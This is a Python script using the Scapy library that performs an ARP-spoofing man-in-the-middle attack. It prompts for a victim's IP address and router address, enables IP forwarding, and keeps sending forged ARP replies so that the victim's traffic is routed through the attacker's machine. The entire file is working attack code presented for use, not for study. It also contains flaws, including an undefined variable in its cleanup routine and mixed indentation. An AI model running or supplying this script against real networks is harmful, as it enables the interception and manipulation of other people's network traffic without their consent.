#updated 11/22 with some different word usage

from scapy.all import *
import sys
import os
import time
 
try:
        interface = raw_input("Please enter your target network interface: ")
        target_ip = raw_input("Please enter your victim's IP address: ")
        router_ip = raw_input("Please enter your victim's router IP address: ")
except KeyboardInterrupt:
        print ("\nUser requested to shutdown")
        print ("Exiting")
        sys.exit(1)
 
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
def find_mac(IP):
        conf.verb = 0
        ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
        for snd,rcv in ans:
                return rcv.sprintf(r"%Ether.src%")
 
def reARP():
       
        print ("\nEverthing is going back to normal")
        target_mac = find_mac(target_ip)
        gatemac = find_mac(router_ip)
        send(ARP(op = 2, pdst = router_ip, psrc = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
        send(ARP(op = 2, pdst = target_ip, psrc = router_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gatemac), count = 7)
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print ("Mac address spoof has been stopped.")
        sys.exit(1)
 
def trick(gm, vm):
        send(ARP(op = 2, pdst = target_ip, psrc = router_ip, hwdst= vm))
        send(ARP(op = 2, pdst = router_ip, psrc = target_ip, hwdst= gm))
 
def mitm():
        try:
                target_mac = find_mac(target_ip)
        except Exception:
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")            
                print ("Can't find your target MAC address!")
		print ("Please try again")
                print ("Exiting")
                sys.exit(1)
        try:
                gatemac = find_mac(router_ip)
        except Exception:
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")            
                print ("Can't find the router MAC address!")
		print ("Please try again!")
                print ("Exiting")
                sys.exit(1)
        print ("\nMac address spoof is now live!")   
	print ("Please check the ARP table on your victim by typing arp -a on the target's CMD.") 
	print ("To stop the MAC spoof attack, please press ctrl + c")   
        while 1:
                try:
                        trick(gatemac, target_mac)
                        time.sleep(1.5)
                except KeyboardInterrupt:
                        reARP()
                        break
mitm()
